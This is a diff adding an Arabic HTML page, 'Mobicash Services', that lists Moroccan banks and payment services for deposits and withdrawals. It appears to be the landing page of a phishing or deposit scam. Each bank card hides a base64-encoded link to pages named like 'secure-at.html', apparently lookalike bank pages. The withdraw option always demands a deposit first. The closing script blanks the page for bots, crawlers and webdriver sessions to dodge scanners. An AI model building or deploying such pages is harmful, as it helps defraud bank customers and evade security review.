@@ -1,1 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mobicash Services</title>
+  <style>
+    :root{--bg:#f7f7f9;--card:#ffffff;--text:#0f172a;--muted:#61708a;--primary:#80a7ff;--primary2:#6b93ef;--border:#e6e8ee;--shadow:0 10px 30px rgba(16,24,40,.08)}
+    html,body{margin:0;overflow-x:hidden;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--text)}
+    header{background:#fff;box-shadow:var(--shadow);padding:12px 16px;border-bottom:1px solid var(--border)}
+    .header-content{display:flex;align-items:center;justify-content:space-between;max-width:960px;margin:0 auto}
+    .menu-icon{font-size:24px;cursor:pointer;color:#2c3e50}
+    .site-title{font-size:18px;font-weight:800;color:#1a1a1a;text-align:center;flex-grow:1;line-height:1.2}
+    .profile-section{display:flex;align-items:center;gap:10px}
+    .profile-icon{width:46px;height:46px;border-radius:50%;background:#eef0f5;display:flex;align-items:center;justify-content:center;border:1px solid var(--border)}
+    .profile-icon svg{width:28px;height:28px}
+    .profile-info{display:flex;flex-direction:column;align-items:flex-end;font-size:13px;line-height:1.2;user-select:all}
+    #userIdDisplay{color:#444;font-weight:600}
+    .profile-label{color:#2e7d32;font-weight:800;margin-right:2px}
+    .account-section{padding:24px 16px;background:var(--bg)}
+    .account-section>div,.account-section>section{max-width:960px;margin:0 auto}
+    .account-header{font-size:14px;font-weight:700;color:#8a94a6;margin:0 0 10px 0;text-align:right}
+    .account-option{background:var(--card);border:1px solid var(--border);border-radius:22px;box-shadow:var(--shadow);overflow:hidden}
+    .option-item{display:flex;align-items:center;padding:14px 16px;cursor:pointer;position:relative;transition:.2s}
+    .option-item:not(:last-child)::after{content:"";position:absolute;bottom:0;right:72px;left:0;height:1px;background:var(--border)}
+    .option-item:hover{background:#f4f6fb}
+    .icon-circle{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin-left:12px;background:#fff;border:1px solid var(--border);box-shadow:0 2px 8px rgba(0,0,0,.05);transition:.2s}
+    .icon-circle img{width:110%;height:110%;object-fit:contain;filter:drop-shadow(0 0 2px rgba(0,0,0,.25));transition:.2s}
+    .option-item:hover .icon-circle{transform:translateY(-1px)}
+    .option-text{flex-grow:1;color:#0b1220;font-size:15px;font-weight:700}
+    .arrow-icon{color:#8a94a6;font-size:18px}
+    .toast{position:fixed;bottom:24px;left:50%;transform:translate(-50%,20px);background:#ef4444;color:#fff;padding:12px 20px;border-radius:12px;font-size:14px;opacity:0;pointer-events:none;z-index:1000;transition:opacity .4s ease,transform .4s ease,visibility .4s ease;box-shadow:0 6px 20px rgba(0,0,0,.2);visibility:hidden}
+    .toast.show{opacity:1;transform:translate(-50%,0);visibility:visible}
+    .recommended-section{padding:18px 0 6px;margin:24px 0 0}
+    .recommended-title{font-size:18px;font-weight:800;color:#0f172a;margin:0 0 14px;text-align:center}
+    .recommended-wrapper{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:14px;width:100%}
+    .bank-card{background:var(--card);border:1px solid var(--border);border-radius:16px;box-shadow:var(--shadow);cursor:pointer;overflow:hidden;display:flex;flex-direction:column;height:110px;transition:.2s}
+    .bank-card:hover{transform:translateY(-2px)}
+    .top-section{background:#fff;height:58%;display:flex;justify-content:center;align-items:center;padding:10px}
+    .top-section img{max-width:90%;max-height:34px;object-fit:contain;transform-style:preserve-3d;transition:transform .45s ease}
+    .top-section img:hover{animation:goBack .5s ease}
+    .bottom-section{background:var(--primary);color:#fff;height:42%;display:flex;align-items:center;justify-content:center;font-size:13px;text-align:center;font-weight:800}
+    @media (max-width:600px){
+      .bank-card{height:100px}
+      .bottom-section{font-size:12px}
+      .recommended-wrapper{grid-template-columns:repeat(3,1fr);gap:12px}
+    }
+    @keyframes goBack{0%{transform:translateZ(0)}50%{transform:translateZ(-80px)}100%{transform:translateZ(0)}}
+    .animate-back{animation:goBack .5s ease}
+    .overlay{position:fixed;inset:0;background:rgba(15,23,42,.28);backdrop-filter:saturate(140%) blur(2px);z-index:2000;opacity:0;pointer-events:none;transition:.25s}
+    .overlay.active{opacity:1;pointer-events:auto}
+    .cta{display:inline-flex;align-items:center;justify-content:center;gap:8px;background:var(--primary);color:#fff;border:0;border-radius:18px;padding:12px 16px;font-weight:800;box-shadow:var(--shadow);cursor:pointer;transition:.2s}
+    .cta:hover{background:var(--primary2)}
+  </style>
+</head>
+<body>
+<div id="toast" class="toast"></div>
+<div id="overlay" class="overlay"></div>
+<header>
+  <div class="header-content">
+    <div class="profile-section">
+      <div class="profile-icon">
+        <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="20" r="10" fill="#ffffff"/><ellipse cx="32" cy="48" rx="18" ry="10" fill="#ffffff"/></svg>
+      </div>
+      <div class="profile-info">
+        <div id="userIdDisplay">id: </div>
+        <div class="profile-label">الملف الشخصي</div>
+      </div>
+    </div>
+    <div class="site-title">Mobicash<br>Services</div>
+    <div class="menu-icon">&#9776;</div>
+  </div>
+</header>
 
+<main class="account-section">
+  <div class="account-header">إدارة الحساب</div>
+  <div class="account-option">
+    <div class="option-item" id="deposit-option">
+      <div class="icon-circle">
+        <img src="https://i.ibb.co/nS2x140/A825-BDBC-18-A3-4-D5-C-9-E17-6-F994-F30-B307-removebg-preview.png" alt="">
+      </div>
+      <div class="option-text">إجراء الإيداع</div>
+      <div class="arrow-icon">›</div>
+    </div>
+    <div class="option-item" id="withdraw-option">
+      <div class="icon-circle">
+        <img src="https://i.ibb.co/rRDF6BbH/9-FD1-E7-E9-36-EE-4530-AC26-5-B1976634666-removebg-preview.png" alt="">
+      </div>
+      <div class="option-text">السحب من الحساب</div>
+      <div class="arrow-icon">›</div>
+    </div>
+  </div>
+
+  <section class="recommended-section" id="recommended">
+    <h3 class="recommended-title">الطرق الموصى بها</h3>
+    <div class="recommended-wrapper">
+      <div class="bank-card" data-enc="c2VjdXJlLWFiLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/tCQqLF96/recharge.png"></div><div class="bottom-section">Al Barid</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWF0Lmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/0QKv4y3Z/recharge.png"></div><div class="bottom-section">Attijari</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWNoLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/6pHN5ZxY/recharge.png"></div><div class="bottom-section">CIH</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWNwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/vZ2pdd5K/recharge.png"></div><div class="bottom-section">Cash Plus</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWJweS5odG1s"><div class="top-section"><img src="https://i.postimg.cc/wjrbGQp8/recharge.png"></div><div class="bottom-section">Barid Pay</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWJwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/8cwZBhHY/recharge.png"></div><div class="bottom-section">Banque Populaire</div></div>
+    </div>
+  </section>
+
+  <section class="recommended-section">
+    <h3 class="recommended-title">صرافات العملات الإلكترونية</h3>
+    <div class="recommended-wrapper">
+      <div class="bank-card" data-enc="c2VjdXJlLXJ0cHkuaHRtbA=="><div class="top-section"><img src="https://i.postimg.cc/hvhd6Tn6/recharge.png"></div><div class="bottom-section">RedotPay</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWJsLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/QdcW2XL8/recharge.png"></div><div class="bottom-section">Lbankalik</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLXNncy5odG1s"><div class="top-section"><img src="https://i.postimg.cc/DZwJ4LS0/recharge.png"></div><div class="bottom-section">Société Générale SGMA</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWNtLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/3JvyGKxX/recharge.png"></div><div class="bottom-section">CDM</div></div>
+    </div>
+  </section>
+
+  <section class="recommended-section">
+    <h3 class="recommended-title">التحويل البنكي</h3>
+    <div class="recommended-wrapper">
+      <div class="bank-card" data-enc="c2VjdXJlLWF0Lmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/0QKv4y3Z/recharge.png"></div><div class="bottom-section">Attijari</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWJwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/8cwZBhHY/recharge.png"></div><div class="bottom-section">Banque Populaire</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWJweS5odG1s"><div class="top-section"><img src="https://i.postimg.cc/wjrbGQp8/recharge.png"></div><div class="bottom-section">Barid Pay</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWNwLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/vZ2pdd5K/recharge.png"></div><div class="bottom-section">Cash Plus</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWNoLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/6pHN5ZxY/recharge.png"></div><div class="bottom-section">CIH</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWFiLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/tCQqLF96/recharge.png"></div><div class="bottom-section">Al Barid</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWNtLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/3JvyGKxX/recharge.png"></div><div class="bottom-section">CDM</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLWJsLmh0bWw="><div class="top-section"><img src="https://i.postimg.cc/QdcW2XL8/recharge.png"></div><div class="bottom-section">Lbankalik</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLXJ0cHkuaHRtbA=="><div class="top-section"><img src="https://i.postimg.cc/hvhd6Tn6/recharge.png"></div><div class="bottom-section">RedotPay</div></div>
+      <div class="bank-card" data-enc="c2VjdXJlLXNncy5odG1s"><div class="top-section"><img src="https://i.postimg.cc/DZwJ4LS0/recharge.png"></div><div class="bottom-section">Société Générale SGMA</div></div>
+    </div>
+  </section>
+</main>
+
+<script>
+  const userId=localStorage.getItem("userId")||"غير مسجل";
+  document.getElementById("userIdDisplay").textContent="id: "+userId;
+  const toast=document.getElementById("toast");
+  function showToast(m){toast.textContent=m;toast.classList.add("show");setTimeout(()=>toast.classList.remove("show"),3000)}
+  document.getElementById("withdraw-option").addEventListener("click",()=>{showToast("الرجاء إجراء الإيداع أولاً للتمكن من استخدام خاصية السحب عبر id.")});
+  document.getElementById("deposit-option").addEventListener("click",()=>{document.getElementById("recommended").scrollIntoView({behavior:"smooth"})});
+  document.querySelectorAll(".bank-card").forEach(c=>{const i=c.querySelector(".top-section img");const e=c.dataset.enc;const o=document.getElementById("overlay");const go=()=>{try{i.classList.add("animate-back");o.classList.add("active");const u=atob(e);setTimeout(()=>location.href=u,600)}catch{}};c.addEventListener("click",go);c.addEventListener("touchstart",t=>{const s=t.touches[0];c.dataset.tx=s.clientX;c.dataset.ty=s.clientY},{passive:true});c.addEventListener("touchend",t=>{const s=t.changedTouches[0];const dx=Math.abs(s.clientX-c.dataset.tx);const dy=Math.abs(s.clientY-c.dataset.ty);if(dx<10&&dy<10)go()})});
+  window.addEventListener("pageshow",function(){const o=document.getElementById("overlay");if(o)o.classList.remove("active");document.querySelectorAll(".top-section img").forEach(m=>m.classList.remove("animate-back"))});
+  if(navigator.webdriver||/bot|crawl|spider|crawling/i.test(navigator.userAgent)){document.body.innerHTML="";alert("تم حظر الوصول.")}
+</script>
+</body>
+</html>
